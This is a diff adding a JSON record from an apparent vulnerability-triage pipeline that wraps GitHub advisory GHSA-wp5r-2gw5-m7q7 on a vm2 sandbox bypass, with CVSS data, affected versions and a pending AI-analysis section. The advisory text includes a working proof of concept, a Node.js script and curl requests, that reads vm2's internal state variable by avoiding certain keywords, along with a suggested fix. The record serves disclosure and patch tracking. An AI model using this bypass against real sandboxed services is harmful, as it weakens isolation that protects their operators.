@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/96663170?v=4\", \"events_url\": \"https://api.github.com/users/koDove/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/koDove/followers\", \"following_url\": \"https://api.github.com/users/koDove/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/koDove/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/koDove\", \"id\": 96663170, \"login\": \"koDove\", \"node_id\": \"U_kgDOBcL2gg\", \"organizations_url\": \"https://api.github.com/users/koDove/orgs\", \"received_events_url\": \"https://api.github.com/users/koDove/received_events\", \"repos_url\": \"https://api.github.com/users/koDove/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/koDove/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/koDove/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/koDove\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-44003\", \"cvss\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-693\", \"name\": \"Protection Mechanism Failure\"}], \"description\": \"### Summary\\nvm2's code transformer has a performance optimization that skips AST analysis when the code does not contain `catch`, `import`, or `async` keywords. This fast-path bypass allows sandboxed code to directly access the internal `VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL` variable, which exposes internal security functions (`handleException`, `wrapWith`, `import`).\\n\\n### Details\\nIn `lib/transformer.js:55-57`, a regex check `/\\\\b(?:catch|import|async)\\\\b/` determines whether AST transformation is needed. If the code does not contain any of these keywords, the transformer returns the code unmodified.\\n\\nWhen the fast-path is taken:\\n1. **INTERNAL_STATE_NAME identifier check is bypassed**: The AST visitor that blocks access to `VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL` never runs\\n2. **`with` statement instrumentation is bypassed**: `with()` statements are not wrapped with `wrapWith()`, enabling scope manipulation\\n3. The internal state object exposes: `handleException(e)`, `wrapWith(x)`, `import(what)`\\n\\nWhile these methods are currently defensive utilities (not direct escape vectors), this represents a complete bypass of a security control. Any future addition of a sensitive method to the internal state object would be immediately exploitable.\\n\\n### PoC\\n\\n**Library-level PoC (Node.js script — primary):**\\n```javascript\\nconst { VM } = require(\\\"vm2\\\");\\nconst vm = new VM();\\n\\n// Access internal state (bypassed — no catch/import/async keywords)\\nconst result = vm.run(`\\n  var x = VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL;\\n  Object.keys(x).join(\\\",\\\")\\n`);\\nconsole.log(result); // \\\"wrapWith,handleException,import\\\"\\n\\n// Control test — blocked when catch keyword is present\\ntry {\\n  vm.run(`\\n    try {\\n      var x = VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL;\\n    } catch(e) { e.message }\\n  `);\\n} catch(e) {\\n  console.log(e.message); // \\\"Use of internal vm2 state variable\\\"\\n}\\n```\\n\\n**HTTP demonstration:**\\n```bash\\n# Internal state access (bypassed)\\ncurl -s -X POST http://localhost:3000/api/execute \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"code\\\":\\\"var x = VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL; Object.keys(x).join(\\\\\\\",\\\\\\\")\\\"}'\\n# Result: \\\"wrapWith,handleException,import\\\"\\n\\n# Control test — blocked when catch keyword is present\\ncurl -s -X POST http://localhost:3000/api/execute \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"code\\\":\\\"try { var x = VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL; } catch(e) { e.message }\\\"}'\\n# Result: {\\\"errors\\\":[\\\"Use of internal vm2 state variable\\\"]}\\n```\\n\\n**Suggested fix:**\\n```javascript\\n// transformer.js:55 — add 'with' keyword and INTERNAL_STATE_NAME check\\nif (!/\\\\b(?:catch|import|async|with)\\\\b/.test(code) && code.indexOf(INTERNAL_STATE_NAME) === -1) {\\n    return {__proto__: null, code, hasAsync: false};\\n}\\n```\\n\\n### Impact\\n- **Security Control Bypass**: The INTERNAL_STATE_NAME access restriction is completely ineffective when the code avoids 3 specific keywords.\\n- **Defense-in-Depth Violation**: Internal security functions are exposed, creating a latent attack surface for future code changes.\\n- **Scope**: All applications using vm2. No special configuration required.\", \"epss\": {\"percentage\": 0.00248, \"percentile\": 0.15849}, \"ghsa_id\": \"GHSA-wp5r-2gw5-m7q7\", \"github_reviewed_at\": \"2026-05-07T04:32:56Z\", \"html_url\": \"https://github.com/advisories/GHSA-wp5r-2gw5-m7q7\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-wp5r-2gw5-m7q7\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-44003\"}], \"nvd_published_at\": \"2026-05-13T18:16:16Z\", \"published_at\": \"2026-05-07T04:32:56Z\", \"references\": [\"https://github.com/patriksimek/vm2/security/advisories/GHSA-wp5r-2gw5-m7q7\", \"https://github.com/patriksimek/vm2/releases/tag/v3.11.0\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-44003\", \"https://github.com/advisories/GHSA-wp5r-2gw5-m7q7\"], \"repository_advisory_url\": \"https://api.github.com/repos/patriksimek/vm2/security-advisories/GHSA-wp5r-2gw5-m7q7\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/patriksimek/vm2\", \"summary\": \"vm2's Transformer Fast-Path Bypass Exposes Internal State Variable\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-14T20:36:59Z\", \"url\": \"https://api.github.com/advisories/GHSA-wp5r-2gw5-m7q7\", \"vulnerabilities\": [{\"first_patched_version\": \"3.11.0\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"vm2\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.10.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-wp5r-2gw5-m7q7",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "vm2: <= 3.10.5"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-44003"
+    ],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "vm2"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.350415Z",
+  "provenance": {
+    "content_sha256": "7ab0d86d7bb0dd5b018487f8c8c233d4c0c3a5fee7068d4fc324e41ccd800356",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-07T04:32:56Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-wp5r-2gw5-m7q7",
+  "status": "active",
+  "title": "vm2's Transformer Fast-Path Bypass Exposes Internal State Variable",
+  "updated_at": "2026-05-14T20:36:59Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-wp5r-2gw5-m7q7"
+}
